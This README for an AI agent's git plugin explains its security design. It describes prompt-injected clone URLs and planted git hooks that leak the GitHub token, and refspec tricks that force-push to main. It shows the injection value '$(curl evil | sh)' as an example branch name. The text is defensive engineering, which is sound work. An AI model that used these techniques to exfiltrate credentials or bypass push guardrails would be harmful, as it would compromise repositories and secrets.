# `@loopingai/plugins/repo`

Clone, commit, push a work branch, open a pull request.

```ts
import { repo } from "@loopingai/plugins/repo";
import { computerExec } from "@loopingai/plugins/computer";

repo({
  exec: computerExec({ binding: env.WORKSPACE, workspaceName: () => name }),
  token: () => env.GITHUB_TOKEN
});
```

Tools: `repo_clone`, `repo_status`, `repo_diff`, `repo_commit`, `repo_push`,
`repo_open_pr`.

`exec` is injected rather than importing [`/computer`](../computer/) directly, so
the two stay independent — a host with its own container can use this against that,
and the tests need no container at all. `computerExec` is that plugin's side of the
same seam; anything with the signature above works.

## Where the token lives

Nowhere the model or the container can read it:

- **Never in a repository the model can configure.** Git executes what
  `.git/config` and `.git/hooks` tell it to, both live in the workspace
  filesystem, and a co-installed shell tool can write them — so a planted
  `pre-push` hook ran on an ordinary `repo_push` and read the token straight out
  of the environment it inherited. Patching that key by key does not work
  either: a URL-specific `http.<url>.sslVerify=false` in the repository's own
  config beats a `-c` override, because specificity outranks precedence. So
  `clone`, `fetch` and `push` run in a bare git dir created per operation, whose
  entire configuration is what `git init` wrote and whose whole config is given
  on the command line — the one channel nothing in the container can rewrite
  underneath us. The checkout's objects are reached through an alternates file,
  so nothing is copied.
- **Never in a command string.** A command line is echoed into stdout, into
  stderr on failure, into shell history, and into any VCR cassette. The token
  goes through `exec`'s per-command `env`, and `git` reads it back via a
  credential helper. Embedding it in the remote URL — the obvious alternative —
  writes it into `.git/config`, where it survives the command.
- **Never offered to a host you did not allow.** This is the one that is easy to
  miss. A helper installed as plain `credential.helper` answers for _every_ host
  — it never sees which one git is asking about — so a clone URL pointing
  anywhere makes git hand the token over the moment that server replies `401`.
  And the clone URL is model input: a repository README, an issue body, or a page
  a co-installed browser plugin fetched is enough to choose it. So the helper is
  bound to `credential.<origin>.helper`, and the URL's host must be on
  `allowedHosts` (default: `github.com`) before anything runs at all.
- **Pull requests are opened from the Worker.** The GitHub REST call happens on
  the Worker side, so the credential that can write to the repository through
  the API never crosses into the container at all.

The same mechanism carries every **model-authored** value — URLs, branch names,
commit messages — as an environment variable rather than interpolating it into a
command, so a branch name of `$(curl evil | sh)` is inert text.

The isolated dir is built, configured and used in **one** command, not three.
That matters because the model has a root shell on the same filesystem: with the
steps split, there was a gap in which a `config` could be planted in the dir, and
a URL-specific `http.<url>.proxy` with `sslVerify=false` in a repository's own
config beats a `-c` override — the very reason the dir exists. So the
credentialed command writes the dir's entire configuration itself, immediately
before git reads it, rather than trusting what it finds.

A refresh is the one operation that cannot collapse all the way, and the reason
is the same rule: seeding the dir means reading the checkout's refs, which is a
`git` command **inside the checkout**, and that is exactly where the token must
never be. So the seed runs on its own with no credential, and the fetch that
follows re-asserts the dir's configuration before using it.

What remains is not zero, and it is worth naming precisely:

- An attacker would now have to win a race _inside_ a single command, against a
  path named from the Worker that it has to discover first. Removing even that
  means not doing authenticated git in the container at all, i.e. pushing from
  the Worker over the forge's API.
- **The token's reach is the token's own.** This plugin checks the _host_ a clone
  or push may target, never the repository — so whatever the credential can read
  or write, an agent that is talked into naming it can reach. That is deliberate:
  a repository allowlist here would block legitimate work like filing a pull
  request against a dependency. It does mean the `GITHUB_TOKEN` should be
  fine-grained and scoped to what the agent is actually for, because nothing
  below it will narrow it further.

## Guardrails are in the tool, not the prompt

`repo_push` refuses, before running anything, in three layers — a guardrail a
model can talk itself out of is not a guardrail:

1. **Anything that is not a plain branch name.** `git push origin <name>` reads
   `<name>` as a _refspec_, so `+x:main` is a force push to main and `x:main` an
   ordinary one — neither of which a list of forbidden names ever sees, because
   it only compares literal strings.
2. **`main`, `master`, `trunk`, `develop`.**
3. **The repository's own default branch**, read from the remote. A repo whose
   trunk is `release` deserves the same protection, and only the remote can say.

It then refuses a fourth thing, after switching to the branch: **a branch with no
commits the default branch does not already have.** Pushing one succeeds,
`repo_open_pr` opens an empty pull request on it, and the round reports a URL as
if the work had landed — the one outcome worse than an error.

`repo_push` **switches to** an existing branch and only creates a missing one. It
used to use `git checkout -B`, which is create-or-_reset_, and that destroyed a
real commit: a model committed, saved the commit with `git branch coder/x`, then
went back to the default branch and reset — and `checkout -B` force-moved
`coder/x` back to where HEAD now was.

`repo_clone` is re-entrant, because a container that outlives its task comes back
with the checkout still in it. It fetches and resets a clean one, and **refuses a
dirty one** rather than resetting over the top: those changes are a previous
task's work, and discarding them is the one outcome nobody can undo.

It also refuses a URL that names no repository — `.../tree/main`, `.../pull/4`,
what a model copies out of a browser. That used to clone into `/workspace/repo`
without firing `beforeCheckout`, so a host keying its filesystem per repository
never switched and the checkout landed in whichever one was already open. The
refusal says what to send instead, which costs a turn and no guessing.

## When the container is not there

`exec` does not only return failures, it throws them: `@cloudflare/computer`
throws when a container is replaced mid-command, and a Durable Object call can
fail outright. None of that reaches the model as a tool error — it is caught
where the command is run and comes back through each tool's own failure
sentence, so `repo_status` says it could not read the status and `repo_push`
says the push did not go, each carrying what a replaced container actually
means: nothing finished, the checkout is durable and untouched, and retrying is
safe because these commands push one specific commit and never force.

The distinction that costs something if you get it wrong is between a command
that **answered no** and one that **never ran**. Three places here read a failure
as an answer — "no checkout in this directory", "no such branch", "no default
branch to protect" — and a container that vanished must not be read as any of
them. A replaced container is exactly the case where the next command lands on a
working replacement, so a probe misread as "empty directory" would send `git
clone` at a checkout that is already there.

## Output is bounded

Every tool truncates from the middle at `maxOutputBytes` (16 KB by default), the
same way `sb_exec` does. `repo_diff` also takes `stat: true` for a per-file
changed-line summary — the right first call on a large change, and the only
practical one for an agent whose entire view of the work is the diff.

## Requirements

A `GITHUB_TOKEN` secret with contents + pull-request write, and a container with
`git` on it.
